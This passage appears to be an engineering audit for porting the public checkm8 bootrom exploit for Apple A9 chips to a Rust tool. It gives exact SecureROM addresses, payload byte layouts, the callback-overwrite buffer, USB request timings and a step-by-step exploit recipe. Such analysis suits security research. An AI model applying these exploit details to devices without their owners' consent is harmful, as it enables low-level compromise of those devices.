                         = 0x1800C8000 + 0x400 = 0x1800C8400            gaster.c:1120
```

Total uploaded buffer (gaster.c:1071):

```
data_sz = 0 + payload_sz + sizeof(A9) + handler_code + handler_struct
        = 176 + 104 + 192 + 56 = 528 bytes
```

528 < 0x800, so the T2 loop (gaster.c:1213-1216) emits **one** 0x800-byte-class DNLOAD of 528
bytes. `data` is `calloc`'d (gaster.c:1071), so the 0 bytes in the two 16-byte `pwnd` fields and
every unset field are guaranteed zero.

**Self-consistency check that the derivation is the intended one (this is the predicate):**

```
payload_dest + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request)
   = 0x1800E0F08 + 192 + 56 = 0x1800E1000 = boot_tramp_end        EXACT
```

The handler + its struct exactly fill the 248 bytes immediately below `boot_tramp_end`. If any
term in gaster.c:1111 were mis-sized, this identity would fail. It holds.

### 4.4 The runtime layout, and why `payload_off` is 280 (INFERRED, with the evidence)

`A9.payload_off = 280` is the offset of the handler inside the uploaded buffer, and the payload
computes the memcpy source as `_main + payload_off` (payload_A9.S:40-42). So `_main` — the
address the code executes from — is the **base of the uploaded 528-byte buffer**. The reference
never states that base; the evidence that it is `insecure_memory_base` (0x180380000) is:

* T1 writes `insecure_memory_base` into the callback field (gaster.c:1194), and that callback is
  what the reset calls (INFERRED, §3.7);
* `gaster_command` sends post-pwn commands by DNLOADing into that same buffer and then issueing
  `0xA1/2` (gaster.c:1484, 976-988);
* the handler reads its command block from `*insecure_memory_base` (payload_handle_checkm8_request.S:38, 43);
* independently, king names the same value `dfu_image_base` for CPID 0x8000/0x8003
  (`usbexec.h:55-61`).

Resulting address map for our device (all arithmetic from the rows in §2.2):

```
0x180380000  _main                      payload code            (176 B)
0x1803800B0  A9 struct begins           pwnd string             (16 B)
0x1803800C0  A9 pool / fields           read by the 12 loads    (88 B)
0x180380118  handler code begins        = _main + payload_off (280)
0x1803801D8  handler struct begins      = handler + 0xC0       (56 B)
   -- memcpy(payload_dest, 0x180380118, 248) at payload_A9.S:43-45 --
0x1800E0F08  handler code (copy)        192 B
0x1800E0FC8  handler struct (copy)       56 B   -> ends at boot_tramp_end
0x1800E0F14  *dfu_handle_request = payload_dest + 12 (payload_A9.S:37-39)
0x1800C8400  ttbr0_vrom_addr (patch target: clear bits 6,7, set bit 7, tlbi)
0x10000812C  patch_addr -> 0xD2800000
```

The `+12` is real, not a constant to copy blindly: `payload_handle_checkm8_request.S:29-31` is a
3-instruction (12-byte) prefix — `LDR X7,=handle_interface_request; BR X7; B _main` — decoded as
`0x58000607`, `0xD61F00E0`, `0x17FFFFFE` at file offsets 0x00, 0x04, 0x08 of that blob, and the
real handler body starts at 0x0C (`LDRH W2,[X0]` = `0x79400002`, matching .S:32). So the DFU
request hook must point 12 bytes into the copy. ✓

### 4.5 `handle_checkm8_request` — 56 bytes, CONFIRMED

```c
struct { uint64_t handle_interface_request, insecure_memory_base, exec_magic,
                  done_magic, memc_magic, memcpy_addr, usb_core_do_transfer; }
       handle_checkm8_request;                     // gaster.c:1019-1021
```

7 × u64 = **56**. Confirmed against `payload_handle_checkm8_request.bin` (248 bytes): the blob is
`0x00-0xBF` code (192 bytes = 48 instructions) then exactly **7** pool words
`0x7FFFFFF0`..`0x7FFFFFF6` at 0xC0-0xF7 (hexdump), matching `payload_handle_checkm8_request.S:19-25`
in order. `LDR X7,[PC,#192]` (`0x58000607`) at offset 0x00 loads the word at 0xC0 ✓.

This struct has **no `pwnd` prefix**, unlike the A9 one: all 56 bytes are pointer slots, so
`sizeof = 8 × slots` here and `sizeof = 16 + 8 × slots` for A9/notA9. That is the invariant to
assert in `a9pwn` (and `INTERFACE.md:166-167` already declares both constants).

**Independent confirmation of the field order** from a completely different source:
`payload_handle_checkm8_request.S:29-53` loads the *command* as
`func ← [x20+0x08]`, `x0..x7 ← [x20+0x10 .. x20+0x50]`. gaster's `gaster_aes` builds exactly that
layout — `struct { uint64_t magic, func, x[8]; }` with `func` at +0x08 and the args from +0x10
(gaster.c:1501-1518). King's independently written `usbexec.cpp:109-111` computes the same
`cmd_data_offset(0) = 16`. Three implementations, one layout. ✓

### 4.6 The overwrite buffer (T1) — 48 bytes, not 6

`checkm8_overwrite_t` (gaster.c:111-113) wraps `dfu_callback_t` (gaster.c:91-96):

```
+0x00 endpoint u32 | +0x04 pad_0 u32 | +0x08 io_buffer u64
+0x10 status u32 | +0x14 io_len u32 | +0x18 ret_cnt u32 | +0x1C pad_1 u32
+0x20 callback u64 | +0x28 next u64      => sizeof = 48
```

gaster zeroes all 48 and stores `insecure_memory_base` at `+0x20` (gaster.c:1193-1196), then
sends **48** bytes (`overwrite_sz = sizeof(checkm8_overwrite)`, gaster.c:1196, 1211). The wire
payload is therefore `<32 zero bytes> <0x180380000 LE> <8 zero bytes>` — **byte-identical** to
ipwndfu's `struct.pack("<32xQQ", 0x180380000, 0)` (`checkm8.py:899`), and `+0x20` is the
`callback` offset of `usb_device_io_request` as documented in `RQ1-BRIEF.md:60`.

⚠ `research/A9-CHECKM8-PAYLOAD.md:316` calls this "a **6-byte** overwrite". That is wrong: it is
48 bytes with 8 meaningful bytes. Do not port a 6-byte write.

---

## 5. Timing, the abort window, and sync vs async

### 5.1 Defaults (gaster.c:1625-1638)

| Parameter | Default | Rule | Source |
|---|---|---|---|
| `usb_timeout` | **5 ms** | `USB_TIMEOUT` env; invalid or `< 1` → 5 | gaster.c:1631-1634 |
| `usb_abort_timeout_min` | **0 ms** | `USB_ABORT_TIMEOUT_MIN` env; invalid or `> usb_timeout` → 0 | gaster.c:1635-1638 |

Both are printed at startup (gaster.c:1634, 1638) — the only two configuration values the
reference ever announces. Note `usb_abort_timeout_min == usb_timeout` is **accepted** by the
check (`>` not `>=`), degenerating the cycle to one value.

`usb_timeout` is used for **three different things**, which is a trap:

1. the blocking transfer timeout, `libusb_control_transfer(..., usb_timeout)` (gaster.c:227);
2. the async transfer's own `transfer->timeout`, `libusb_fill_control_transfer(..., usb_timeout)`
   (gaster.c:255);
3. the device-search poll interval, `sleep_ms(usb_timeout)` (gaster.c:214).

### 5.2 The abort-window advance

Initial value: `usb_abort_timeout = usb_timeout - 1` (gaster.c:849, 871).
On a failed attempt (gaster.c:857, 878):

```
t = (t + 1) % (usb_timeout - usb_abort_timeout_min + 1) + usb_abort_timeout_min
```

Defaults ⇒ modulus 6, values `4, 5, 0, 1, 2, 3, 4, …`. With `usb_timeout = 5` and
`usb_abort_timeout_min = 0`, **`t = 5` is degenerate**: the transfer's own 5 ms timeout
(gaster.c:255) expires no later than the cancel loop's window, so the abort that lands is the
kernel/libk timeout, not the explicit cancel. INFERRED from the two timeouts being equal; the
reference does not document it. A port must record *which* mechanism ended each pre-empted
transfer, which is exactly `XferStatus::Timeout` vs `XferStatus::Cancelled`.

### 5.3 `send_usb_control_request_no_data` vs `send_usb_control_request_async_no_data`

These are the two wrappers (gaster.c:467-480 and 482-495). They differ by exactly one callee, and
that callee differs in five ways that matter:

| | `..._no_data` → `send_usb_control_request` | `..._async_no_data` → `send_usb_control_request_async` |
|---|---|---|
| libusb call | `libusb_control_transfer(..., usb_timeout)` (gaster.c:227) | submit + `libusb_handle_events_timeout_completed` (gaster.c:243-283) |
| Termination | the backend's own timeout, **always `usb_timeout`** | natural completion, else `libusb_cancel_transfer` after the **caller-supplied** window (gaster.c:260-261) |
| Cancellation | none explicit | explicit, re-issued on every event-loop tick while not completed (gaster.c:259-261) |
| Return value | **always `true`** (gaster.c:239) | `completed != 0` (gaster.c:282) |
| `transfer_ret` written | always, when non-NULL (gaster.c:229-238) | **only if `completed != 0`** (gaster.c:262-276) — on the failure paths `*transfer_ret` is left **untouched** |
| Status mapping | `LIBUSB_ERROR_PIPE` → STALL, else ERROR (gaster.c:233-237) | `LIBUSB_TRANSFER_COMPLETED` → OK, `STALL` → STALL, **everything else → ERROR** (gaster.c:268-274) |
| Darwin path | `DeviceRequestTO` (gaster.c:423) | `DeviceRequestAsyncTO` + `sleep_ms(window)` + **`USBDeviceAbortPipeZero`** (gaster.c:449-453) |

**What the exploit is actually doing with the async call** (this is the part that is routinely
misunderstood):

> The async call is not "a control transfer with a short timeout". It is a transfer that is
> **deliberately left dangling on the device and then torn down from the host**, and whose
> *partial byte count* is the measurement the exploit runs on. `sz` is not a diagnostic; in
> S1 (`sz < config_overwrite_pad`) and in Y2/Y3 (`sz == 0`) it **is the pass condition**.
> The abort window selects *where in the transfer* the teardown lands, and the sweep
> (gaster.c:857) is a search over that position.

Consequences for the port:

* A port must expose the async call as a distinct primitive that *guarantees* it spends real
  wall-clock time before cancelling, and that reports `transferred` even on the cancelled path.
  `INTERFACE.md:124-129` specifies exactly this; a9lab's King port failed here because its
  wall-clock wait was `double t = timeout/1000.0` compared against a seconds-resolution clock —
  the loop body ran zero times and the cancel fired immediately
  (EXTERNAL-CLAIM: `research/A9-CHECKM8-PAYLOAD.md:318-343`, with line cites to `dfu.cpp`).
  I did not re-read `dfu.cpp` myself; treat the *diagnosis* as secondhand and the *required
  behaviour* (spend the time, report the bytes) as first-class.
* `*transfer_ret` being left untouched when the async call fails matters: gaster's callers read
  `transfer_ret.sz` after a `&&` chain, and the `&&` short-circuits on the `false` return, so the
  stale value is never consumed. A port that ignores the return value and reads `sz` anyway reads
  garbage. Model the result as an `Option`/`Result` in Rust, never as a mutable out-param.

### 5.4 The libusb event-loop idiom, precisely (gaster.c:256-277)

```c
tv.tv_sec  = usb_abort_timeout / 1000;
tv.tv_usec = (usb_abort_timeout % 1000) * 1000;
while (completed == 0
       && libusb_handle_events_timeout_completed(NULL, &tv, &completed) == LIBUSB_SUCCESS)
    libusb_cancel_transfer(transfer);
if (completed != 0) { /* copy IN data; fill transfer_ret from transfer->status */ }
```

Note the order: **cancel is the loop body**, so it runs only when the event wait *timed out*
without completion. On the first iteration `completed` is checked before the wait, so a transfer
that completes within the window is never cancelled. `tv` is re-armed on each iteration — whether
`libusb_handle_events_timeout_completed` mutates `tv` is a libusb-internal detail I did **not**
verify (no libusb source in this tree) → **UNVERIFIABLE here**; a port using `rusb`/`nusb` with an
explicit deadline is strictly more predictable, and `INTERFACE.md:128` already asks for a
deadline.

The IN-buffer copy at gaster.c:263-264 uses `libusb_control_transfer_get_data(transfer)` and
`transfer->actual_length`, and the buffer is `malloc`'d and freed **after** the transfer is
destroyed (gaster.c:250, 278-280). Both matter for a safe port.

---

## 6. OBSERVABILITY GAPS — what the reference does not record and a9pwn must

Each item is something a9pwn must emit that gaster cannot. `G` numbers are cited elsewhere in
this document.

| # | Gap | Evidence | What a9pwn must record |
|---|---|---|---|
| **G1** | `send_usb_control_request` **always returns true**; the boolean half of every predicate is dead | gaster.c:239 (and 434 in the IOKit twin) | `Transport::control*` must return a real result; never model transport success as `bool` |
| **G2** | The 528-byte payload upload is **entirely unchecked** — `transfer_ret` is `NULL` and the return is a constant `true` | gaster.c:1213-1216 | per-packet OK + exact size, and a `PAYLOAD_UPLOAD_FAILED` verdict |
| **G3** | The SETUP sweep is silent: no attempt counter, no window, no observed `sz`, no bound | gaster.c:852-858 | one trace line per attempt: window, `transferred`, status, and a budget |
| **G4** | `TIMED_OUT`, `CANCELLED`, `NO_DEVICE` and every other libusb error collapse to `USB_TRANSFER_ERROR` | gaster.c:272-274, 236-237 | the 6-state `XferStatus` of `INTERFACE.md:39` |
| **G5** | The libusb return code is discarded except for `LIBUSB_ERROR_PIPE` | gaster.c:227-238 | `libusb_rc` on every result |
| **G6** | No timing at all: no per-transfer duration, no per-stage duration, no total | whole file — `sleep_ms` is the only time call | `micros` per transfer; round and total wall time |
| **G7** | An unrecognised `SRTG` loops forever **with no message**; only `CPID: 0x%X` is ever printed | gaster.c:809-816, 207-214, 810 | print the full serial, the parsed identity, and the "no table row" reason (a9pwn already has `WRONG_BOOT_STAGE`/`UNSUPPORTED_CHIP`) |
| **G8** | `get_usb_serial_number` validates only `sz == buf[0]`; `bDescriptorType` and the language ID are never checked, and any failure returns NULL silently (looks like "no device") | gaster.c:504-510 | validate descriptor type/langid, and distinguish "descriptor read failed" from "device absent" |
| **G9** | The 18-byte device descriptor is read into an 18-byte struct and only `i_serial_number` is used; `bLength`/`bDescriptorType` are never validated | gaster.c:167-173, 504 | validate, and log `i_serial_number` |
| **G10** | `checkm8_stage_spray` returns `true` unconditionally, so "ret: true" after SPRAY is meaningless | gaster.c:917, 1262-1263 | report the per-primitive outcomes (the triple), not a stage-level boolean |
| **G11** | PATCH's closing manifest dance ignores its own results: T3/T4 pass `NULL`, T5 discards the bools | gaster.c:1218-1222 | check and trace all five |
| **G12** | T1's `sz` is never read; only STALL is tested | gaster.c:1211 | record `transferred` on the overwrite request |
| **G13** | `checkm8_stage_reset`'s recovery `CLR_STATUS` result is discarded and its failure reason is not reported | gaster.c:843-844 | which of R1-R6 failed |
| **G14** | There is no round counter and no record of which attempt succeeded | gaster.c:1239-1274 | `rounds`, `abort_sweep` (`INTERFACE.md:267-276`) |
| **G15** | `close_usb_handle` destroys the whole libusb context each stage (`libusb_exit(NULL)`) and `wait_usb_handle` re-inits it | gaster.c:191-195, 204 | must be a deliberate decision, not an accident: if a9pwn keeps one context, it must still fully re-open the node and re-read the identity each round |
| **G16** | `reset_usb_handle` returns `void` and **discards `libusb_reset_device`'s result** — the reference cannot tell a real bus reset from a silent pipe cycle | gaster.c:197-200, 1268 | a9pwn's `ResetReport`/`ResetCapability` (`INTERFACE.md:104-109, 132`). This gap is what `NO_RESET_CAPABILITY` exists for |
| **G17** | The DFU status reply's `poll_timeout[3]` and `str_idx` bytes are read and thrown away | gaster.c:821-826 | log the full 6 bytes |
| **G18** | `config_overwrite_pad` is used but the *measured* `sz` that produced it is never reported | gaster.c:853 | log `sz` and the derived pad for every attempt (this is the number that proves the device's timing) |
| **G19** | There is no bound of any kind: three of the loops are `for(;;)`/`while(1)` | gaster.c:852, 874, 902, 1243 | budgets + `Exhausted { rounds }` |
| **G20** | Success is asserted only by `strstr` on the *next* enumeration's serial number; the descriptor index written at `usb_serial_number_string_descriptor` is never read back | gaster.c:811, 1160 payload_A9.S:57-58 | re-read the serial explicitly after F1, and record the pre/post strings |
| **G21** | Nothing distinguishes "the device left DFU/re-enumerated as something else" from "still 05AC:1227 but not pwned" | gaster.c:207-214 | record PID/VID on every re-open |
| **G22** | The sticky per-SoC statics (§2.1) are never logged, so a wrong row is invisible | gaster.c:152-175 | dump the whole `SocConfig` used, with the `SRTG` that selected it (a9pwn's `plan`/`FieldTrace` already does this) |

---

## 7. CONTRADICTION RESOLVED: `384/576/912` vs `176/280/248/528`

The Lead asked for this explicitly, and both the tree document and the Lead's digest contain
arithmetic that must not survive.

### 7.1 Two different payload families, one shared number

| | **ipwndfu / King family** | **gaster family** (our port target) |
|---|---|---|
| shellcode | `checkm8_nopaddingcorruption_arm64.bin`, **312 bytes** | `payload_A9.bin`, **280 bytes** |
| handler | `usb_0xA1_2_arm64.bin`, **528 bytes** | `payload_handle_checkm8_request.bin`, **248 bytes** |
| offset/size vocabulary | `PAYLOAD_OFFSET_ARM64 = 384`, `PAYLOAD_SIZE_ARM64 = 576` | `payload_off = 280`, `payload_sz = 248` (both derived) |
| delivered blob | `312 + 72 zeros (= 384) + 528 = `**`912`** bytes | `176 + 104 + 192 + 56 = `**`528`** bytes |
| `payload_dest` | **hardcoded `0x1800E0C00`** | **derived `0x1800E0F08`** |
| pointer to the handler | `dfu_handle_request = 0x1800878F8` ← `payload_dest + 12` | `PAYLOAD_PTR = 0x1800878F8` (same SecureROM variable; the *value* ipwndfu stores there is not verified in this audit) |
| extra work | none (no TTBR0/WXN patch) | TTBR0 bits + `patch_addr` WXN patch in the payload |
| licence | GPLv3 / none | Apache-2.0 |

Sources: `research/refs/ipwndfu-hd/src/ipwndfu/checkm8.py:221-224` (offsets/sizes),
`:587-614` (s8003 constants, `PAYLOAD_DEST = 0x1800E0C00` at :592, `PAYLOAD_PTR = 0x1800878F8`
at :595, the 384+…+handler composition at :610-614); file sizes measured this session (312, 528;
`a9lab/king/bin/` holds byte-identical copies, SHA-256 `2B5C7FB1…` for the shellcode).
gaster side: §4 above.

**The 384/576/912 numbers describe the ipwndfu/King blob. They do not describe gaster's
`payload_A9.bin`.** `research/A9-CHECKM8-PAYLOAD.md:175-179` says this correctly. The error is
confined to that document's §1.3.

### 7.2 Four errors in `research/A9-CHECKM8-PAYLOAD.md`, and the corrected arithmetic

| Line | Claim | Correct |
|---|---|---|
| `:105-111` | "Two independent confirmations of `PAYLOAD_DEST` … `0x1800E1000 − 248 − 56 = 0x1800E0C00`. Matches the hardcoded value exactly." | **Wrong three ways.** `payload_handle_checkm8_request_sz` **is** `248 − 56 = 192`; subtracting 56 again double-counts. And `0x1800E1000 − 248 − 56 = 0x1800E0ED0`, not `0x1800E0C00`. gaster's formula gives **`0x1800E0F08`** (gaster.c:1111). **`PAYLOAD_DEST` does NOT agree between the two families** — they differ by 0x308 bytes. The "two independent confirmations" is a coincidence manufactured by bad arithmetic. |
| `:113` | "vs the payload's own pointer arithmetic (`payload_A9.S:38,49-50`: `add x1, x0, #0xC` … `add x5, x0, #0x18`)" | `payload_A9.S:38` is `add x1, x0, #0xC` ✓, but `payload_A9.S` contains **no `x5` and no `0x18`** at all (grep: zero hits). Those instructions belong to the ipwndfu-family shellcode, not to gaster's. |
| `:316` | "it uses a **6-byte** overwrite (`checkm8_overwrite_t.callback.callback = insecure_memory_base`)" | `sizeof(checkm8_overwrite_t) = sizeof(dfu_callback_t) = 48`, and 48 bytes go on the wire (§4.6). The *meaningful* write is 8 bytes at `+0x20`; the transfer is 48. |
| `:365` | "gaster's A9 'spray' is a single bounded triple (stall + leak + no-leak) that **cannot loop forever**" | It **can**: `while(!stall || !leak || !no_leak) {}` (gaster.c:902) has no counter and no bound. Only our `SetupBudget`/rounds make it bounded. |

**Answer to the Lead's question 2 — the correct numbers for the vendored 280-byte
`payload_A9.bin` (SHA-256 `A698045F…A532B2`):**

```
payload_sz (code portion, = 280 − 104)                             = 176
payload_off (= payload_sz + sizeof(A9) = 176 + 104)                = 280
A9.payload_sz (handler code + handler struct = 192 + 56)           = 248
payload_dest (= 0x1800E1000 − 192 − 56)                            = 0x1800E0F08
total upload (= 176 + 104 + 192 + 56)                              = 528   (one DNLOAD, < 0x800)
invariant check: 0x1800E0F08 + 192 + 56                            = 0x1800E1000 = boot_tramp_end ✓
```

And the Lead's digest needs one correction of its own: it wrote
`0x1800E1000 − 248 − 56 = 0x1800E0C00` and then concluded "`payload_dest` agrees [with the
tree]". It does not: gaster's is `0x1800E0F08`. That expression is also internally inconsistent
(it evaluates to `0x1800E0ED0`).

### 7.3 Instruction-level proof that 280 is the right `payload_off`

The check the Lead asked for, done: §4.2 decodes **all twelve** literal loads in the vendored
blob and shows they land on 0xC0, 0xC8, 0xD0, 0xD8, 0xE0, 0xE8, 0xF0 (twice, deduplicated),
0xF8, 0x100, 0x108, 0x110 — i.e. on the 11 placeholder words plus the reused slot — and the two
`ADR`s land on 0x00 (`_main`) and 0xB0 (`A9.pwnd[0]`).

Because the pool begins at 0xB0 + 16 = 0xC0 and the struct must begin 16 bytes before the pool,
`sizeof(A9) = 104` and `payload_sz = 280 − 104 = 176` are **forced** by the bytes. A 384-byte
`payload_off` would make the payload's memcpy read from `_main + 384`, which in this blob is
*beyond the 280-byte file* — i.e. into whatever the caller's `calloc` left there (zeros) — and
`adr x1, PWND_STR` would still read 0xB0, so the serial number would still change while the
handler never got copied. That is a *silent* wrong-offset failure, exactly the class this tree
has been burned by. **The 384 figure must never be applied to `payload_A9.bin`.**

### 7.4 Action for the tree

`research/A9-CHECKM8-PAYLOAD.md` §1.3 (`:79-120`) and `:316` must be treated as **wrong** for the
gaster row: the file is otherwise a good document about the ipwndfu/King family and about King's
libusb defect. Future sessions must not re-derive 384/576/912 or `payload_dest = 0x1800E0C00`
from it *for gaster*.

---

## 8. EXPLICIT RISKS

### R1 — `payload_dest` differs between the two families, and neither is verified on A9

gaster: `0x1800E0F08` (derived, gaster.c:1111). ipwndfu/King: `0x1800E0C00` (hardcoded,
`checkm8.py:592`). Both are below `boot_tramp_end = 0x1800E1000` and both leave room for their
own handler (248 vs 528 bytes) without crossing it, so **both are internally consistent and the
choice is not decidable from source**. Confidence that gaster's derivation is *what gaster
intends*: **high** (the `dest + handler = boot_tramp_end` identity holds exactly, §4.3).
Confidence that it is *correct on silicon*: **unresolved** — see R2.

**Consequence for the port:** `payload_dest` is not self-checking on the device. The only
checkable predicate is the identity in §4.3. If the A9 pwn fails at PATCH with everything else
looking right, this constant is a suspect, and the ipwndfu value is the obvious A/B experiment
(`--payload-dest` override), run by the Lead.

### R2 — no verified A9 success report for gaster (EXTERNAL-CLAIM, not verified by me)

`research/A9-CHECKM8-PAYLOAD.md:415` states it could not find a log, issue or writeup of a
successful A9 pwn with gaster, and `:19-20` states the A8/A9 path in King was contributed as a
patch tested only on **t7000 (A8)**. Both claims were produced by another session's web research;
I did not repeat that search → **UNVERIFIABLE here**. What I *can* confirm from source: the two
A9 rows are the only evidence in this tree that these exact addresses belong to these exact iBoot
builds, and `axi0mX/ipwndfu` (the original) shipped no A9 support at all
(EXTERNAL-CLAIM: `A9-CHECKM8-PAYLOAD.md:427`; I did not open that README).

**Practical position for a9pwn:** the A9 path is best-effort against an unproven address table.
That is an argument for *more* instrumentation, not less — every field must be printed before it
is used (`a9pwn plan`), so a failure can be attributed to a specific constant rather than to
"checkm8 didn't work".

### R3 — "A9 needs no heap grooming" is FALSE as stated; the code grooms

The two positions and where they actually live:

* `a9lab/RQ1-BRIEF.md:67` quotes The Apple Wiki: *"This leak is not needed on A8, A8X and A9
  devices — where a **DFU abort bug** is abused to achieve direct code execution without the need
  of ROP or JOP."* (EXTERNAL-CLAIM; I did not fetch the wiki.)
* `research/A9-CHECKM8-PAYLOAD.md:239-262` documents, for A8/A9: `stall(); leak(); 40× no_leak();
  usb_reset()` — CONFIRMED against `checkm8.py:910-915`.

**These do not actually contradict each other, and the reason is a naming collision:** the wiki's
"leak" is the *memory-leak primitive* (queued zero-length packets leaking 0x800 allocations,
used on A10/A11 to open a heap hole for the ROP chain — `RQ1-BRIEF.md:54`); ipwndfu's `leak()` and
`usb_req_leak()` are *descriptor requests*, and they are still sent on A8/A9. The Lead's digest
also mis-cites the second half: lines `239-262` of `RQ1-BRIEF.md` are about the SEP and Linux,
not about grooming — the 40× sequence is in the *other* document.

**What gaster's code implements for 0x8003/0x8000** (CONFIRMED, and this is the authority for
a9pwn): a **bounded-content, unbounded-count triple** — one `usb_request_stall`, one
`usb_request_leak` (0x40), one `no_leak` (0xC1), re-run as a whole until all three pass, then
`CLR_STATUS` with `wLength 0xC1` (gaster.c:901-902, 910). It does **not** use `config_hole`
(0 for A9), does **not** use `config_large_leak` (0 for A9), and does **not** do ipwndfu's 40×
`no_leak`.

**So: "A9 needs no heap grooming" must not be used to delete STAGE_SPRAY.** The defensible
version of the claim is narrower: *A9 needs no `config_hole` / `large_leak` parameterisation and
no ROP/JOP callback chain* — which `A9-CHECKM8-PAYLOAD.md:347-365` states correctly. The single
`no_leak` vs ipwndfu's forty is a **real, unresolved behavioural difference** between two
implementations that both claim to work on A9; `RQ1-BRIEF.md:271` already flags the descriptor
primitive as "the single highest-value early experiment". Confidence that gaster's triple is
sufficient: **unresolved**. Confidence that grooming is present: **high** (read the code).

---

## 9. Cross-checks performed, and what they do and do not establish

| Cross-check | Result |
|---|---|
| Vendored blobs vs reference blobs | **identical**, SHA-256 verified this session (3 files) |
| A9 row (0x8003) vs A9 row (0x8000) | identical except `cpid` — diffed field by field (§2.2) |
| gaster's addresses vs king's `ExecConfig` | `aes_crypto_cmd` `0x10000DAA0` for both `s8003si/iBoot-2234.0.0.2.22` and `s8000si/iBoot-2234.0.0.3.3` (`usbexec.h:192-194`) — **matches** gaster.c:630, 647 |
| gaster's `insecure_memory_base` vs king's platform table | `0x180380000` (`usbexec.h:55-61`, named `dfu_image_base`) — **matches** gaster.c:637 |
| gaster's in-memory command layout vs the handler assembly | `func` at `+0x08`, args from `+0x10` — commanded by `payload_handle_checkm8_request.S:48-53`, built by gaster.c:1501-1518 — **matches** |
| the same layout vs king's `usbexec.cpp` | `cmd_data_offset(0) = 16` (`usbexec.cpp:109-111`) — **matches** |
| gaster's 48-byte overwrite vs ipwndfu's | `<32 zeros><0x180380000><8 zeros>` both — `checkm8.py:899` vs gaster.c:1193-1196 — **matches** |
| `checkm8_usb_request_stall` vs `usb_req_stall` | identical tuple `0x02/3 wV 0 wI 0x80 wL 0` — `checkm8.py:196` — **matches** |
| **`usbexec.cpp` contains no checkm8 code** | grep for `checkm8\|payload\|exploit\|LOAD_ADDRESS`: **zero hits**. It is the *post-pwn* memory/AES command layer (king's port of `usbexec.py`); the only overlap with the pwn is the magic values and the shared `insecure_memory_base`. Do not expect it to corroborate the exploit sequence. |
| gaster's `payload_dest` vs ipwndfu's | **differ** by 0x308: `0x1800E0F08` vs `0x1800E0C00`. Not a confirmation — see R1. |

### One more thing a9pwn should consider (house rule: read the tool, then ask if we can do better)

`gaster.c:504` reads the serial number with a **255-byte** buffer and requires `sz == buf[0]`,
then drops the last UTF-16 code unit (`str[sz-1] = '\0'`, gaster.c:508). Any string descriptor
longer than 255 bytes, or one with an odd `bLength`, is silently mangled. a9pwn should read the
descriptor twice (length first, then exactly `bLength` bytes) and validate
`bDescriptorType == 3` and the langid. This is a *transport* improvement, not an algorithm
change, and it costs nothing.

---

## 10. Actionable summary for the port (each item cites its authority)

1. Keep the stage order and the per-stage reset: RESET → SETUP → SPRAY → PATCH → reset →
   re-open → read serial → PWND test (gaster.c:1231-1276). The reset after PATCH is the trigger,
   not cleanup.
2. Keep `config_overwrite_pad = 0x500` and **measure** `sz` on every S1 attempt; the pad is
   `0x500 - sz` and **STALL is the pass condition** (gaster.c:853).
3. Keep S2's request class `bm = 0x00`, `b = 0x0` — not `0x21/1`.
4. Implement STAGE_SPRAY as the triple `0x02/3 wI 0x80` (expect STALL) → `0x80/6 wI 0x0A wL 0x40`
   (expect `sz == 0`) → `0x80/6 wI 0x0A wL 0xC1` (expect `sz == 0`), retried as a whole, then
   `CLR_STATUS wL 0xC1` (gaster.c:901-910). Do **not** require `Ok` on the two aborted descriptor
   reads — requiring it will never pass (gaster.c:866, 886).
5. Read `i_serial_number` from the device descriptor and use it in `wValue` — do not hardcode
   `0x304` (gaster.c:504, 866).
6. Build the 528-byte buffer exactly as §4.3, and assert both invariants at build time:
   `dest + 248 == boot_tramp_end` and `data.len() == 176 + 104 + 192 + 56`.
7. The 48-byte overwrite with `insecure_memory_base` at `+0x20` is the whole control-flow
   hijack on A9; expect **STALL** (gaster.c:1211).
8. `usb_timeout = 5 ms`, `usb_abort_timeout_min = 0 ms`, window starts at 4 and advances by
   `(t+1) % 6` — and log every value (gaster.c:849, 857, 1631-1638).
9. Treat `INTERFACE.md`'s `--leak-windex-ipwndfu` as a live experiment, not a fallback: `wI 0x0A`
   is gaster-only and is the one parameter this audit could not resolve from source (§3.9).
10. Never let a transport call return a constant `true` (G1), and never discard a reset's return
    code (G16). Those two gaps are the reason a9pwn exists.

---

## Appendix A — re-derivation recipe

Everything in §4 and §7 was produced from the vendored bytes; it can be re-checked without a
disassembler:

* The pool words are plain little-endian u64 at file offsets `0xC0 + 8n`; the placeholder value
  `0x7FFFFFF0 + n` identifies the struct field at **struct offset `16 + 8n`** (equivalently file
  offset `0xB0 + 16 + 8n`). For A9, `n = 0..10` ⇒ offsets 16..96 and `sizeof = 16 + 8×11 = 104`;
  for `handle_checkm8_request` there is no 16-byte prefix, so the field offset is `8n` and
  `sizeof = 8×7 = 56`.
* A 64-bit `LDR (literal)` is `0x58000000 | (imm19<<5) | Rt`; target `= addr + imm19*4`.
* An `ADR` is `0x10000000 | (immlo<<29) | (immhi<<5) | Rd`; `imm = (immhi<<2) | immlo`, signed
  21-bit; target `= addr + imm`.
* Worked examples: `0x580005E0` at 0x04 → `imm19 = 0x2F` → `0x04 + 188 = 0xC0`;
  `0x10FFFF21` at 0x1C → `imm = -0x1C` → `0x00`; `0x10000361` at 0x44 → `imm = +0x6C` → `0xB0`.

## Appendix B — every file:line cited in this document

`research/refs/gaster/gaster.c` — 29-52, 91-96, 111-113, 152-175, 177-200, 202-240, 242-283,
285-290, 410-435, 437-457, 467-495, 497-511, 513-817, 519, 534, 549, 624-657, 809-816, 819-827,
829-834, 836-860, 862-894, 896-918, 920-974, 976-988, 990-1006, 1008-1229, 1010-1024, 1042-1064,
1066-1090, 1091-1106, 1108-1134, 1189-1211, 1213-1224, 1231-1276, 1278-1475, 1477-1555,
1557-1611, 1613-1623, 1625-1667.
`research/refs/gaster/payload_A9.S` — 19-29, 33-77, 36, 37-39, 40-45, 49-50, 51-53, 54-58,
59-75, 79-80.
`research/refs/gaster/payload_handle_checkm8_request.S` — 19-31, 32, 38-53, 54-55, 57-67, 69-74.
`research/refs/gaster/payload_notA9.S` — 19-28. `research/refs/gaster/Makefile` — 36-51.
`a9pwn/payloads/README.md` — 16-49 (its 104/56 and pool-offset claims are **confirmed** here).
`a9pwn/INTERFACE.md` — 124-135, 166-167, 199-200, 203, 237-250, 267-276.
`research/refs/ipwndfu-hd/src/ipwndfu/checkm8.py` — 181-202, 221-224, 587-614 (esp. 592, 595,
610-614), 889-945 (esp. 898-899, 910-921, 926-937).
`a9lab/king/include/usbexec.h` — 28-93, 186-219. `a9lab/king/src/usbexec.cpp` — 109-115,
117-143, 291-321.
`research/A9-CHECKM8-PAYLOAD.md` — 19-25, 105-120, 175-181, 239-262, 316, 318-343, 347-415, 441.
`a9lab/RQ1-BRIEF.md` — 54, 60-67, 271, 81-82.
